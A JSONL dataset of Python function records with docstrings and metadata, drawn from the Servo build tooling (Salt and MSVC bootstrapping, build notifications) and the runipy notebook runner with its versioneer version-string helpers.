{"docstring": "# Ensure Salt dependencies are installed\n", "func_signal": "def salt(context, force=False):\n", "code": "install_salt_dependencies(context, force)\n# Ensure Salt is installed in the virtualenv\n# It's not instaled globally because it's a large, non-required dependency,\n# and the installation fails on Windows\nprint(\"Checking Salt installation...\", end='')\nreqs_path = os.path.join(context.topdir, 'python', 'requirements-salt.txt')\nprocess = subprocess.Popen(\n    [\"pip\", \"install\", \"-q\", \"-I\", \"-r\", reqs_path],\n    stdout=PIPE,\n    stderr=PIPE\n)\nprocess.wait()\nif process.returncode:\n    out, err = process.communicate()\n    print('failed to install Salt via pip:')\n    print('Output: {}\\nError: {}'.format(out, err))\n    return 1\nprint(\"done\")\n\nsalt_root = os.path.join(context.sharedir, 'salt')\nconfig_dir = os.path.join(salt_root, 'etc', 'salt')\npillar_dir = os.path.join(config_dir, 'pillars')\n\n# In order to allow `mach bootstrap` to work from any CWD,\n# the `root_dir` must be an absolute path.\n# We place it under `context.sharedir` because\n# Salt caches data (e.g. gitfs files) in its `var` subdirectory.\n# Hence, dynamically generate the config with an appropriate `root_dir`\n# and serialize it as JSON (which is valid YAML).\nconfig = {\n    'hash_type': 'sha384',\n    'master': 'localhost',\n    'root_dir': salt_root,\n    'state_output': 'changes',\n    'state_tabular': True,\n}\nif 'SERVO_SALTFS_ROOT' in os.environ:\n    config.update({\n        'fileserver_backend': ['roots'],\n        'file_roots': {\n            'base': [os.path.abspath(os.environ['SERVO_SALTFS_ROOT'])],\n        },\n    })\nelse:\n    config.update({\n        'fileserver_backend': ['git'],\n        'gitfs_env_whitelist': 'base',\n        'gitfs_provider': 'gitpython',\n        'gitfs_remotes': [\n            'https://github.com/servo/saltfs.git',\n        ],\n    })\n\nif not os.path.exists(config_dir):\n    os.makedirs(config_dir, mode=0o700)\nwith open(os.path.join(config_dir, 'minion'), 'w') as config_file:\n    config_file.write(json.dumps(config) + '\\n')\n\n# Similarly, the pillar data is created dynamically\n# and temporarily serialized to disk.\n# This dynamism is not yet used, but will be in the future\n# to enable Android bootstrapping by using\n# context.sharedir as a location for Android packages.\npillar = {\n    'top.sls': {\n        'base': {\n            '*': ['bootstrap'],\n        },\n    },\n    'bootstrap.sls': {\n        'fully_managed': False,\n    },\n}\nif os.path.exists(pillar_dir):\n    shutil.rmtree(pillar_dir)\nos.makedirs(pillar_dir, mode=0o700)\nfor filename in pillar:\n    with open(os.path.join(pillar_dir, filename), 'w') as pillar_file:\n        pillar_file.write(json.dumps(pillar[filename]) + '\\n')\n\ncmd = [\n    # sudo escapes from the venv, need to use full path\n    find_executable('salt-call'),\n    '--local',\n    '--config-dir={}'.format(config_dir),\n    '--pillar-root={}'.format(pillar_dir),\n    'state.apply',\n    'servo-build-dependencies',\n]\n\nif not force:\n    print('Running bootstrap in dry-run mode to show changes')\n    # Because `test=True` mode runs each state individually without\n    # considering how required/previous states affect the system,\n    # it will often report states with requisites as failing due\n    # to the requisites not actually being run,\n    # even though these are spurious and will succeed during\n    # the actual highstate.\n    # Hence `--retcode-passthrough` is not helpful in dry-run mode,\n    # so only detect failures of the actual salt-call binary itself.\n    retcode = run_as_root(cmd + ['test=True'])\n    if retcode != 0:\n        print('Something went wrong while bootstrapping')\n        return retcode\n\n    proceed = raw_input(\n        'Proposed changes are above, proceed with bootstrap? [y/N]: '\n    )\n    if proceed.lower() not in ['y', 'yes']:\n        return 0\n\n    print('')\n\nprint('Running Salt bootstrap')\nretcode = run_as_root(cmd + ['--retcode-passthrough'])\nif retcode == 0:\n    print('Salt bootstrapping complete')\nelse:\n    print('Salt bootstrapping encountered errors')\nreturn retcode", "path": "python\\servo\\bootstrap.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# Fetch Rust and Cargo\n", "func_signal": "def fetch(self):\n", "code": "self.ensure_bootstrapped()\n\n# Fetch Cargo dependencies\nwith cd(self.context.topdir):\n    call([\"cargo\", \"fetch\"], env=self.build_env())", "path": "python\\servo\\devenv_commands.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "'''Bootstrapper for MSVC building on Windows.'''\n\n", "func_signal": "def windows_msvc(context, force=False):\n", "code": "deps_dir = os.path.join(context.sharedir, \"msvc-dependencies\")\ndeps_url = \"https://servo-deps.s3.amazonaws.com/msvc-deps/\"\n\ndef version(package):\n    return packages.WINDOWS_MSVC[package]\n\ndef package_dir(package):\n    return os.path.join(deps_dir, package, version(package))\n\ndef check_cmake(version):\n    cmake_path = find_executable(\"cmake\")\n    if cmake_path:\n        cmake = subprocess.Popen([cmake_path, \"--version\"], stdout=PIPE)\n        cmake_version = cmake.stdout.read().splitlines()[0].replace(\"cmake version \", \"\")\n        if LooseVersion(cmake_version) >= LooseVersion(version):\n            return True\n    return False\n\nto_install = {}\nfor package in packages.WINDOWS_MSVC:\n    # Don't install CMake if it already exists in PATH\n    if package == \"cmake\" and check_cmake(version(\"cmake\")):\n        continue\n\n    if not os.path.isdir(package_dir(package)):\n        to_install[package] = version(package)\n\nif not to_install:\n    return 0\n\nprint(\"Installing missing MSVC dependencies...\")\nfor package in to_install:\n    full_spec = '{}-{}'.format(package, version(package))\n\n    parent_dir = os.path.dirname(package_dir(package))\n    if not os.path.isdir(parent_dir):\n        os.makedirs(parent_dir)\n\n    zip_path = package_dir(package) + \".zip\"\n    if not os.path.isfile(zip_path):\n        zip_url = \"{}{}.zip\".format(deps_url, full_spec)\n        download_file(full_spec, zip_url, zip_path)\n\n    print(\"Extracting {}...\".format(full_spec), end='')\n    extract(zip_path, deps_dir)\n    print(\"done\")\n\n    extracted_path = os.path.join(deps_dir, full_spec)\n    os.rename(extracted_path, package_dir(package))\n\nreturn 0", "path": "python\\servo\\bootstrap.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# There is a bug in subprocess where it doesn't like unicode types in\n# environment variables. Here, ensure all unicode are converted to\n# binary. utf-8 is our globally assumed default. If the caller doesn't\n# want UTF-8, they shouldn't pass in a unicode instance.\n", "func_signal": "def normalize_env(env):\n", "code": "normalized_env = {}\nfor k, v in env.items():\n    if isinstance(k, unicode):\n        k = k.encode('utf-8', 'strict')\n\n    if isinstance(v, unicode):\n        v = v.encode('utf-8', 'strict')\n\n    normalized_env[k] = v\n\nreturn normalized_env", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Return a list of optional features to enable for the Servo crate\"\"\"\n", "func_signal": "def servo_features(self):\n", "code": "features = []\nif self.config[\"build\"][\"debug-mozjs\"]:\n    features += [\"debugmozjs\"]\nreturn features", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Wrap `subprocess.check_call`, printing the command if verbose=True.\n\nAlso fix any unicode-containing `env`, for subprocess \"\"\"\n", "func_signal": "def check_call(*args, **kwargs):\n", "code": "verbose = kwargs.pop('verbose', False)\n\nif 'env' in kwargs:\n    kwargs['env'] = normalize_env(kwargs['env'])\n\nif verbose:\n    print(' '.join(args[0]))\n# we have to use shell=True in order to get PATH handling\n# when looking for the binary on Windows\nproc = subprocess.Popen(*args, shell=sys.platform == 'win32', **kwargs)\nstatus = None\n# Leave it to the subprocess to handle Ctrl+C. If it terminates as\n# a result of Ctrl+C, proc.wait() will return a status code, and,\n# we get out of the loop. If it doesn't, like e.g. gdb, we continue\n# waiting.\nwhile status is None:\n    try:\n        status = proc.wait()\n    except KeyboardInterrupt:\n        pass\n\nif status:\n    raise subprocess.CalledProcessError(status, ' '.join(*args))", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Generate desktop notification when build is complete and the\nelapsed build time was longer than 30 seconds.\"\"\"\n", "func_signal": "def notify_build_done(config, elapsed, success=True):\n", "code": "if elapsed > 30:\n    notify(config, \"Servo build\",\n           \"%s in %s\" % (\"Completed\" if success else \"FAILED\", format_duration(elapsed)))", "path": "python\\servo\\build_commands.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Generate a desktop notification using appropriate means on\nsupported platforms Linux, Windows, and Mac OS.  On unsupported\nplatforms, this function acts as a no-op.\n\nIf notify-command is set in the [tools] section of the configuration,\nthat is used instead.\"\"\"\n", "func_signal": "def notify(config, title, text):\n", "code": "notify_command = config[\"tools\"].get(\"notify-command\")\nif notify_command:\n    func = notify_with_command(notify_command)\nelse:\n    platforms = {\n        \"linux\": notify_linux,\n        \"linux2\": notify_linux,\n        \"win32\": notify_win,\n        \"darwin\": notify_darwin\n    }\n    func = platforms.get(sys.platform)\n\nif func is not None:\n    try:\n        func(title, text)\n    except Exception as e:\n        extra = getattr(e, \"message\", \"\")\n        print(\"[Warning] Could not generate notification! %s\" % extra, file=sys.stderr)", "path": "python\\servo\\build_commands.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Context manager for changing the current locale\"\"\"\n", "func_signal": "def setlocale(name):\n", "code": "saved_locale = locale.setlocale(locale.LC_ALL)\ntry:\n    yield locale.setlocale(locale.LC_ALL, name)\nfinally:\n    locale.setlocale(locale.LC_ALL, saved_locale)", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Set proper LD_LIBRARY_PATH and DRIVE for software rendering on Linux and OSX\"\"\"\n", "func_signal": "def set_osmesa_env(bin_path, env):\n", "code": "if is_linux():\n    dep_path = find_dep_path_newest('osmesa-src', bin_path)\n    if not dep_path:\n        return None\n    osmesa_path = path.join(dep_path, \"out\", \"lib\", \"gallium\")\n    env[\"LD_LIBRARY_PATH\"] = osmesa_path\n    env[\"GALLIUM_DRIVER\"] = \"softpipe\"\nelif is_macosx():\n    osmesa_dep_path = find_dep_path_newest('osmesa-src', bin_path)\n    if not osmesa_dep_path:\n        return None\n    osmesa_path = path.join(osmesa_dep_path,\n                            \"out\", \"src\", \"gallium\", \"targets\", \"osmesa\", \".libs\")\n    glapi_path = path.join(osmesa_dep_path,\n                           \"out\", \"src\", \"mapi\", \"shared-glapi\", \".libs\")\n    env[\"DYLD_LIBRARY_PATH\"] = osmesa_path + \":\" + glapi_path\n    env[\"GALLIUM_DRIVER\"] = \"softpipe\"\nreturn env", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# Virtualenv calls its scripts folder \"bin\" on linux/OSX/MSYS64 but \"Scripts\" on Windows\n", "func_signal": "def _get_virtualenv_script_dir():\n", "code": "if os.name == \"nt\" and os.sep != \"/\":\n    return \"Scripts\"\nreturn \"bin\"", "path": "python\\mach_bootstrap.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# TAG-DISTANCE-gHEX[-dirty], like 'git describe --tags --dirty\n# --always -long'. The distance/hash is unconditional.\n\n# exceptions:\n# 1: no tags. HEX[-dirty]  (note: no 'g' prefix)\n\n", "func_signal": "def render_git_describe_long(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    rendered += \"-%d-g%s\" % (pieces[\"distance\"], pieces[\"short\"])\nelse:\n    # exception #1\n    rendered = pieces[\"short\"]\nif pieces[\"dirty\"]:\n    rendered += \"-dirty\"\nreturn rendered", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# TAG[-DISTANCE-gHEX][-dirty], like 'git describe --tags --dirty\n# --always'\n\n# exceptions:\n# 1: no tags. HEX[-dirty]  (note: no 'g' prefix)\n\n", "func_signal": "def render_git_describe(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"]:\n        rendered += \"-%d-g%s\" % (pieces[\"distance\"], pieces[\"short\"])\nelse:\n    # exception #1\n    rendered = pieces[\"short\"]\nif pieces[\"dirty\"]:\n    rendered += \"-dirty\"\nreturn rendered", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# TAG[.postDISTANCE[.dev0]] . The \".dev0\" means dirty.\n\n# exceptions:\n# 1: no tags. 0.postDISTANCE[.dev0]\n\n", "func_signal": "def render_pep440_old(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += \".post%d\" % pieces[\"distance\"]\n        if pieces[\"dirty\"]:\n            rendered += \".dev0\"\nelse:\n    # exception #1\n    rendered = \"0.post%d\" % pieces[\"distance\"]\n    if pieces[\"dirty\"]:\n        rendered += \".dev0\"\nreturn rendered", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# now build up version string, with post-release \"local version\n# identifier\". Our goal: TAG[+DISTANCE.gHEX[.dirty]] . Note that if you\n# get a tagged build and then dirty it, you'll get TAG+0.gHEX.dirty\n\n# exceptions:\n# 1: no tags. git_describe was just HEX. 0+untagged.DISTANCE.gHEX[.dirty]\n\n", "func_signal": "def render_pep440(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += plus_or_dot(pieces)\n        rendered += \"%d.g%s\" % (pieces[\"distance\"], pieces[\"short\"])\n        if pieces[\"dirty\"]:\n            rendered += \".dirty\"\nelse:\n    # exception #1\n    rendered = \"0+untagged.%d.g%s\" % (pieces[\"distance\"],\n                                      pieces[\"short\"])\n    if pieces[\"dirty\"]:\n        rendered += \".dirty\"\nreturn rendered", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# This might raise EnvironmentError (if setup.cfg is missing), or\n# configparser.NoSectionError (if it lacks a [versioneer] section), or\n# configparser.NoOptionError (if it lacks \"VCS=\"). See the docstring at\n# the top of versioneer.py for instructions on writing your setup.cfg .\n", "func_signal": "def get_config_from_root(root):\n", "code": "setup_cfg = os.path.join(root, \"setup.cfg\")\nparser = configparser.SafeConfigParser()\nwith open(setup_cfg, \"r\") as f:\n    parser.readfp(f)\nVCS = parser.get(\"versioneer\", \"VCS\")  # mandatory\n\ndef get(parser, name):\n    if parser.has_option(\"versioneer\", name):\n        return parser.get(\"versioneer\", name)\n    return None\ncfg = VersioneerConfig()\ncfg.VCS = VCS\ncfg.style = get(parser, \"style\") or \"\"\ncfg.versionfile_source = get(parser, \"versionfile_source\")\ncfg.versionfile_build = get(parser, \"versionfile_build\")\ncfg.tag_prefix = get(parser, \"tag_prefix\")\ncfg.parentdir_prefix = get(parser, \"parentdir_prefix\")\ncfg.verbose = get(parser, \"verbose\")\nreturn cfg", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "\"\"\"Run a notebook cell and update the output of that cell in-place.\"\"\"\n", "func_signal": "def run_cell(self, cell):\n", "code": "logging.info('Running cell:\\n%s\\n', cell.input)\nself.kc.execute(cell.input)\nreply = self.kc.get_shell_msg()\nstatus = reply['content']['status']\ntraceback_text = ''\nif status == 'error':\n    traceback_text = 'Cell raised uncaught exception: \\n' + \\\n        '\\n'.join(reply['content']['traceback'])\n    logging.info(traceback_text)\nelse:\n    logging.info('Cell returned')\n\nouts = list()\nwhile True:\n    try:\n        msg = self.kc.get_iopub_msg(timeout=1)\n        if msg['msg_type'] == 'status':\n            if msg['content']['execution_state'] == 'idle':\n                break\n    except Empty:\n        # execution state should return to idle\n        # before the queue becomes empty,\n        # if it doesn't, something bad has happened\n        raise\n\n    content = msg['content']\n    msg_type = msg['msg_type']\n\n    # IPython 3.0.0-dev writes pyerr/pyout in the notebook format\n    # but uses error/execute_result in the message spec. This does the\n    # translation needed for tests to pass with IPython 3.0.0-dev\n    notebook3_format_conversions = {\n        'error': 'pyerr',\n        'execute_result': 'pyout'\n    }\n    msg_type = notebook3_format_conversions.get(msg_type, msg_type)\n\n    out = NotebookNode(output_type=msg_type)\n\n    if 'execution_count' in content:\n        cell['prompt_number'] = content['execution_count']\n        out.prompt_number = content['execution_count']\n\n    if msg_type in ('status', 'pyin', 'execute_input'):\n        continue\n    elif msg_type == 'stream':\n        out.stream = content['name']\n        # in msgspec 5, this is name, text\n        # in msgspec 4, this is name, data\n        if 'text' in content:\n            out.text = content['text']\n        else:\n            out.text = content['data']\n    elif msg_type in ('display_data', 'pyout'):\n        for mime, data in content['data'].items():\n            try:\n                attr = self.MIME_MAP[mime]\n            except KeyError:\n                raise NotImplementedError(\n                    'unhandled mime type: %s' % mime\n                )\n\n            # In notebook version <= 3 JSON data is stored as a string\n            # Evaluation of IPython2's JSON gives strings directly\n            # Therefore do not encode for IPython versions prior to 3\n            json_encode = (\n                    IPython.version_info[0] >= 3 and\n                    mime == \"application/json\")\n\n            data_out = data if not json_encode else json.dumps(data)\n            setattr(out, attr, data_out)\n    elif msg_type == 'pyerr':\n        out.ename = content['ename']\n        out.evalue = content['evalue']\n        out.traceback = content['traceback']\n    elif msg_type == 'clear_output':\n        outs = list()\n        continue\n    else:\n        raise NotImplementedError(\n            'unhandled iopub message: %s' % msg_type\n        )\n    outs.append(out)\ncell['outputs'] = outs\n\nif status == 'error':\n    raise NotebookError(traceback_text)", "path": "runipy\\notebook_runner.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# Source tarballs conventionally unpack into a directory that includes\n# both the project name and a version string.\n", "func_signal": "def versions_from_parentdir(parentdir_prefix, root, verbose):\n", "code": "dirname = os.path.basename(root)\nif not dirname.startswith(parentdir_prefix):\n    if verbose:\n        print(\"guessing rootdir is '%s', but '%s' doesn't start with \"\n              \"prefix '%s'\" % (root, dirname, parentdir_prefix))\n    raise NotThisMethod(\"rootdir doesn't start with parentdir_prefix\")\nreturn {\"version\": dirname[len(parentdir_prefix):],\n        \"full-revisionid\": None,\n        \"dirty\": False, \"error\": None}", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# the code embedded in _version.py can just fetch the value of these\n# keywords. When used from setup.py, we don't want to import _version.py,\n# so we do it with a regexp instead. This function is not used from\n# _version.py.\n", "func_signal": "def git_get_keywords(versionfile_abs):\n", "code": "keywords = {}\ntry:\n    f = open(versionfile_abs, \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(\"git_refnames =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"refnames\"] = mo.group(1)\n        if line.strip().startswith(\"git_full =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"full\"] = mo.group(1)\n    f.close()\nexcept EnvironmentError:\n    pass\nreturn keywords", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# TAG[.post.devDISTANCE] . No -dirty\n\n# exceptions:\n# 1: no tags. 0.post.devDISTANCE\n\n", "func_signal": "def render_pep440_pre(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"]:\n        rendered += \".post.dev%d\" % pieces[\"distance\"]\nelse:\n    # exception #1\n    rendered = \"0.post.dev%d\" % pieces[\"distance\"]\nreturn rendered", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# Backport BlockingKernelClient.wait_for_ready from IPython 3.\n# Wait for kernel info reply on shell channel.\n", "func_signal": "def _wait_for_ready_backport(self):\n", "code": "self.kc.kernel_info()\nwhile True:\n    msg = self.kc.get_shell_msg(block=True, timeout=30)\n    if msg['msg_type'] == 'kernel_info_reply':\n        break\n\n# Flush IOPub channel\nwhile True:\n    try:\n        msg = self.kc.get_iopub_msg(block=True, timeout=0.2)\n    except Empty:\n        break", "path": "runipy\\notebook_runner.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "\"\"\"\nRun all the notebook cells in order and update the outputs in-place.\n\nIf ``skip_exceptions`` is set, then if exceptions occur in a cell, the\nsubsequent cells are run (by default, the notebook execution stops).\n\"\"\"\n", "func_signal": "def run_notebook(self, skip_exceptions=False, progress_callback=None):\n", "code": "for i, cell in enumerate(self.iter_code_cells()):\n    try:\n        self.run_cell(cell)\n    except NotebookError:\n        if not skip_exceptions:\n            raise\n    if progress_callback:\n        progress_callback(i)", "path": "runipy\\notebook_runner.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# this runs 'git' from the root of the source tree. This only gets called\n# if the git-archive 'subst' keywords were *not* expanded, and\n# _version.py hasn't already been rewritten with a short version string,\n# meaning we're inside a checked out source tree.\n\n", "func_signal": "def git_pieces_from_vcs(tag_prefix, root, verbose, run_command=run_command):\n", "code": "if not os.path.exists(os.path.join(root, \".git\")):\n    if verbose:\n        print(\"no .git in %s\" % root)\n    raise NotThisMethod(\"no .git directory\")\n\nGITS = [\"git\"]\nif sys.platform == \"win32\":\n    GITS = [\"git.cmd\", \"git.exe\"]\n# if there is a tag, this yields TAG-NUM-gHEX[-dirty]\n# if there are no tags, this yields HEX[-dirty] (no NUM)\ndescribe_out = run_command(GITS, [\"describe\", \"--tags\", \"--dirty\",\n                                  \"--always\", \"--long\"],\n                           cwd=root)\n# --long was added in git-1.5.5\nif describe_out is None:\n    raise NotThisMethod(\"'git describe' failed\")\ndescribe_out = describe_out.strip()\nfull_out = run_command(GITS, [\"rev-parse\", \"HEAD\"], cwd=root)\nif full_out is None:\n    raise NotThisMethod(\"'git rev-parse' failed\")\nfull_out = full_out.strip()\n\npieces = {}\npieces[\"long\"] = full_out\npieces[\"short\"] = full_out[:7]  # maybe improved later\npieces[\"error\"] = None\n\n# parse describe_out. It will be like TAG-NUM-gHEX[-dirty] or HEX[-dirty]\n# TAG might have hyphens.\ngit_describe = describe_out\n\n# look for -dirty suffix\ndirty = git_describe.endswith(\"-dirty\")\npieces[\"dirty\"] = dirty\nif dirty:\n    git_describe = git_describe[:git_describe.rindex(\"-dirty\")]\n\n# now we have TAG-NUM-gHEX or HEX\n\nif \"-\" in git_describe:\n    # TAG-NUM-gHEX\n    mo = re.search(r'^(.+)-(\\d+)-g([0-9a-f]+)$', git_describe)\n    if not mo:\n        # unparseable. Maybe git-describe is misbehaving?\n        pieces[\"error\"] = (\"unable to parse git-describe output: '%s'\"\n                           % describe_out)\n        return pieces\n\n    # tag\n    full_tag = mo.group(1)\n    if not full_tag.startswith(tag_prefix):\n        if verbose:\n            fmt = \"tag '%s' doesn't start with prefix '%s'\"\n            print(fmt % (full_tag, tag_prefix))\n        pieces[\"error\"] = (\"tag '%s' doesn't start with prefix '%s'\"\n                           % (full_tag, tag_prefix))\n        return pieces\n    pieces[\"closest-tag\"] = full_tag[len(tag_prefix):]\n\n    # distance: number of commits since tag\n    pieces[\"distance\"] = int(mo.group(2))\n\n    # commit: short hex revision ID\n    pieces[\"short\"] = mo.group(3)\n\nelse:\n    # HEX: no tags\n    pieces[\"closest-tag\"] = None\n    count_out = run_command(GITS, [\"rev-list\", \"HEAD\", \"--count\"],\n                            cwd=root)\n    pieces[\"distance\"] = int(count_out)  # total number of commits\n\nreturn pieces", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# these strings are filled in when 'setup.py versioneer' creates\n# _version.py\n", "func_signal": "def get_config():\n", "code": "cfg = VersioneerConfig()\ncfg.VCS = \"git\"\ncfg.style = \"%(STYLE)s\"\ncfg.tag_prefix = \"%(TAG_PREFIX)s\"\ncfg.parentdir_prefix = \"%(PARENTDIR_PREFIX)s\"\ncfg.versionfile_source = \"%(VERSIONFILE_SOURCE)s\"\ncfg.verbose = False\nreturn cfg", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# now build up version string, with post-release \"local version\n# identifier\". Our goal: TAG[+DISTANCE.gHEX[.dirty]] . Note that if you\n# get a tagged build and then dirty it, you'll get TAG+0.gHEX.dirty\n\n# exceptions:\n# 1: no tags. git_describe was just HEX. 0+untagged.DISTANCE.gHEX[.dirty]\n\n", "func_signal": "def render_pep440(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += plus_or_dot(pieces)\n        rendered += \"%d.g%s\" % (pieces[\"distance\"], pieces[\"short\"])\n        if pieces[\"dirty\"]:\n            rendered += \".dirty\"\nelse:\n    # exception #1\n    rendered = \"0+untagged.%d.g%s\" % (pieces[\"distance\"],\n                                      pieces[\"short\"])\n    if pieces[\"dirty\"]:\n        rendered += \".dirty\"\nreturn rendered", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# Source tarballs conventionally unpack into a directory that includes\n# both the project name and a version string.\n", "func_signal": "def versions_from_parentdir(parentdir_prefix, root, verbose):\n", "code": "dirname = os.path.basename(root)\nif not dirname.startswith(parentdir_prefix):\n    if verbose:\n        print(\"guessing rootdir is '%s', but '%s' doesn't start with \"\n              \"prefix '%s'\" % (root, dirname, parentdir_prefix))\n    raise NotThisMethod(\"rootdir doesn't start with parentdir_prefix\")\nreturn {\"version\": dirname[len(parentdir_prefix):],\n        \"full-revisionid\": None,\n        \"dirty\": False, \"error\": None}", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# TAG[.postDISTANCE[.dev0]] . The \".dev0\" means dirty.\n\n# exceptions:\n# 1: no tags. 0.postDISTANCE[.dev0]\n\n", "func_signal": "def render_pep440_old(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += \".post%d\" % pieces[\"distance\"]\n        if pieces[\"dirty\"]:\n            rendered += \".dev0\"\nelse:\n    # exception #1\n    rendered = \"0.post%d\" % pieces[\"distance\"]\n    if pieces[\"dirty\"]:\n        rendered += \".dev0\"\nreturn rendered", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# I am in _version.py, which lives at ROOT/VERSIONFILE_SOURCE. If we have\n# __file__, we can work backwards from there to the root. Some\n# py2exe/bbfreeze/non-CPython implementations don't do __file__, in which\n# case we can only use expanded keywords.\n\n", "func_signal": "def get_versions():\n", "code": "cfg = get_config()\nverbose = cfg.verbose\n\ntry:\n    return git_versions_from_keywords(get_keywords(), cfg.tag_prefix,\n                                      verbose)\nexcept NotThisMethod:\n    pass\n\ntry:\n    root = os.path.realpath(__file__)\n    # versionfile_source is the relative path from the top of the source\n    # tree (where the .git directory might live) to this file. Invert\n    # this to find the root from __file__.\n    for i in cfg.versionfile_source.split('/'):\n        root = os.path.dirname(root)\nexcept NameError:\n    return {\"version\": \"0+unknown\", \"full-revisionid\": None,\n            \"dirty\": None,\n            \"error\": \"unable to find root of source tree\"}\n\ntry:\n    pieces = git_pieces_from_vcs(cfg.tag_prefix, root, verbose)\n    return render(pieces, cfg.style)\nexcept NotThisMethod:\n    pass\n\ntry:\n    if cfg.parentdir_prefix:\n        return versions_from_parentdir(cfg.parentdir_prefix, root, verbose)\nexcept NotThisMethod:\n    pass\n\nreturn {\"version\": \"0+unknown\", \"full-revisionid\": None,\n        \"dirty\": None,\n        \"error\": \"unable to compute version\"}", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# TAG[.postDISTANCE[.dev0]+gHEX] . The \".dev0\" means dirty. Note that\n# .dev0 sorts backwards (a dirty tree will appear \"older\" than the\n# corresponding clean one), but you shouldn't be releasing software with\n# -dirty anyways.\n\n# exceptions:\n# 1: no tags. 0.postDISTANCE[.dev0]\n\n", "func_signal": "def render_pep440_post(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += \".post%d\" % pieces[\"distance\"]\n        if pieces[\"dirty\"]:\n            rendered += \".dev0\"\n        rendered += plus_or_dot(pieces)\n        rendered += \"g%s\" % pieces[\"short\"]\nelse:\n    # exception #1\n    rendered = \"0.post%d\" % pieces[\"distance\"]\n    if pieces[\"dirty\"]:\n        rendered += \".dev0\"\n    rendered += \"+g%s\" % pieces[\"short\"]\nreturn rendered", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
